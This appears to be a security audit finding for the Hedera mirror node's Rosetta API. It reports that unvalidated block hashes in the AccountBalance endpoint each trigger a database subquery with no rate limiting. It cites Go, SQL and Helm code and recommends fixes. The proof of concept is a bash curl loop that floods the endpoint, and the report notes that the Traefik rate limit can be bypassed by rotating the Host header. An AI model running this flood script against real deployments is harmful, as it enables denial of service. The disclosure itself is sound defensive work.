### Title
Unauthenticated Resource Exhaustion via Unbounded DB Queries in `AccountBalance` Hash Lookup

### Summary
The `AccountBalance` endpoint accepts an arbitrary `BlockIdentifier.Hash` from any unauthenticated caller and unconditionally executes a correlated subquery against the `record_file` table for each request. There is no application-level rate limiting in the Rosetta Go service, and the only input guard rejects only the empty string. An attacker can flood the endpoint with distinct hash values, each triggering a fresh DB query, driving database CPU and I/O well above the 30% threshold.

### Finding Description

**Exact code path:**

1. `rosetta/app/services/account_service.go` line 52–56 — `AccountBalance()` calls `a.RetrieveBlock(ctx, request.BlockIdentifier)` whenever `BlockIdentifier != nil`, with no validation of the hash field. [1](#0-0) 

2. `rosetta/app/services/base_service.go` lines 84–86 — `RetrieveBlock()` strips the `0x` prefix (trivial O(1) op) and passes the raw string directly to `blockRepo.FindByHash()`. [2](#0-1) 

3. `rosetta/app/persistence/block.go` lines 135–145 — `FindByHash()` rejects only the empty string; any non-empty value proceeds to `findBlockByHash()`. [3](#0-2) 

4. `rosetta/app/persistence/block.go` lines 226–241 — `findBlockByHash()` executes `selectByHashWithIndex`, a correlated subquery that joins `record_file` against itself, for every call. [4](#0-3) 

The SQL query itself: [5](#0-4) 

**Root cause:** The application layer has zero rate limiting. `rosetta/main.go` wires only `healthController` and `metricsController` — no throttle middleware is registered for the account endpoint. [6](#0-5) 

The Traefik-based rate limit (`average: 10`, `inFlightReq: 5`) exists only in the optional Helm chart and is absent in any non-Kubernetes deployment. Furthermore, the rate limit criterion is `requestHost: true` (keyed on the HTTP `Host` header), not source IP, so an attacker can trivially rotate the `Host` header to bypass it. [7](#0-6) 

**Failed assumption:** The design assumes infrastructure-level controls (Traefik) will always be present and sufficient. They are neither mandatory nor bypass-resistant.

### Impact Explanation
Each request with a unique hash value causes one correlated subquery execution against `record_file`. Because every hash is distinct, no query-result caching is possible. Under sustained flood (e.g., 100–1000 req/s from a single host without Traefik), the database CPU and I/O climb proportionally. On a lightly loaded node this easily exceeds the 30% resource-consumption threshold. The same `findBlockByHash` path is shared by `BlockTransaction` and `FindByIdentifier`, multiplying the attack surface. The service has no circuit breaker or back-pressure mechanism at the Go layer.

### Likelihood Explanation
No authentication, API key, or session token is required. The Rosetta API is intentionally public. The attacker needs only HTTP access to port 8080 (or whatever the exposed port is) and the ability to generate distinct hex strings. This is trivially scriptable. Deployments outside Kubernetes (bare Docker, direct binary) have no rate limiting whatsoever. Even Kubernetes deployments are vulnerable if the `Host` header is rotated.

### Recommendation
1. **Application-level rate limiting**: Add a token-bucket or sliding-window rate limiter in the Go HTTP middleware layer (e.g., `golang.org/x/time/rate`) keyed on source IP, applied before any handler is invoked.
2. **Hash format validation**: Before calling `FindByHash`, validate that the hash is a well-formed hex string of the expected length (e.g., exactly 96 hex characters for a SHA-384 record-file hash). Reject malformed values with `ErrInvalidArgument` before touching the database.
3. **DB query timeout**: Enforce a short per-query context deadline in `findBlockByHash` so a slow query cannot hold a DB connection indefinitely.
4. **Do not rely solely on Traefik**: Infrastructure controls are deployment-dependent and bypassable via `Host` header rotation; they must be complemented by application-layer enforcement.

### Proof of Concept

```bash
# Generate 10000 distinct fake hashes and flood the endpoint
for i in $(seq 1 10000); do
  HASH=$(head -c 48 /dev/urandom | xxd -p | tr -d '\n')
  curl -s -o /dev/null -X POST http://<rosetta-host>:8080/account/balance \
    -H "Content-Type: application/json" \
    -d "{
      \"network_identifier\": {\"blockchain\":\"Hedera\",\"network\":\"mainnet\"},
      \"account_identifier\": {\"address\":\"0.0.2\"},
      \"block_identifier\": {\"hash\":\"${HASH}\"}
    }" &
done
wait
```

Each iteration sends a request with a unique, non-empty hash that passes the `hash == ""` guard, reaches `findBlockByHash`, and executes the correlated `selectByHashWithIndex` query. Monitoring `pg_stat_activity` on the database will show a spike in active queries and CPU utilization proportional to the request rate, with no application-layer mechanism to stop it.

### Citations

**File:** rosetta/app/services/account_service.go (L52-56)
```go
	if request.BlockIdentifier != nil {
		block, rErr = a.RetrieveBlock(ctx, request.BlockIdentifier)
	} else {
		block, rErr = a.RetrieveLatest(ctx)
	}
```

**File:** rosetta/app/services/base_service.go (L84-86)
```go
	} else if bIdentifier.Index == nil && bIdentifier.Hash != nil {
		h := tools.SafeRemoveHexPrefix(*bIdentifier.Hash)
		return b.blockRepo.FindByHash(ctx, h)
```

**File:** rosetta/app/persistence/block.go (L34-45)
```go
	selectByHashWithIndex string = `select
                                      consensus_start,
                                      coalesce((
                                        select c.consensus_start - 1
                                        from record_file c
                                        where c.index = p.index + 1
                                      ), consensus_end) as consensus_end,
                                      hash,
                                      index,
                                      prev_hash
                                    from record_file p
                                    where hash = @hash collate "C"`
```

**File:** rosetta/app/persistence/block.go (L135-145)
```go
func (br *blockRepository) FindByHash(ctx context.Context, hash string) (*types.Block, *rTypes.Error) {
	if hash == "" {
		return nil, hErrors.ErrInvalidArgument
	}

	if err := br.initGenesisRecordFile(ctx); err != nil {
		return nil, err
	}

	return br.findBlockByHash(ctx, hash)
}
```

**File:** rosetta/app/persistence/block.go (L226-241)
```go
func (br *blockRepository) findBlockByHash(ctx context.Context, hash string) (*types.Block, *rTypes.Error) {
	db, cancel := br.dbClient.GetDbWithContext(ctx)
	defer cancel()

	rb := &recordBlock{}
	if err := db.Raw(selectByHashWithIndex, sql.Named("hash", hash)).First(rb).Error; err != nil {
		return nil, handleDatabaseError(err, hErrors.ErrBlockNotFound)
	}

	if rb.Index < br.genesisBlock.Index {
		log.Errorf("The block with hash %s is before the genesis block", hash)
		return nil, hErrors.ErrBlockNotFound
	}

	return rb.ToBlock(br.genesisBlock), nil
}
```

**File:** rosetta/main.go (L103-119)
```go
	accountAPIService := services.NewAccountAPIService(baseService, accountRepo, mirrorConfig.Common.Shard, mirrorConfig.Common.Realm)
	accountAPIController := server.NewAccountAPIController(accountAPIService, asserter)
	healthController, err := middleware.NewHealthController(&mirrorConfig.Rosetta)
	metricsController := middleware.NewMetricsController()
	if err != nil {
		return nil, err
	}

	return server.NewRouter(
		networkAPIController,
		blockAPIController,
		mempoolAPIController,
		constructionAPIController,
		accountAPIController,
		healthController,
		metricsController,
	), nil
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L149-166)
```yaml
middleware:
  - circuitBreaker:
      expression: NetworkErrorRatio() > 0.25 || ResponseCodeRatio(500, 600, 0, 600) > 0.25
  - inFlightReq:
      amount: 5
      sourceCriterion:
        ipStrategy:
          depth: 1
  - rateLimit:
      average: 10
      sourceCriterion:
        requestHost: true
  - retry:
      attempts: 3
      initialInterval: 100ms
  - stripPrefix:
      prefixes:
        - "/rosetta"
```
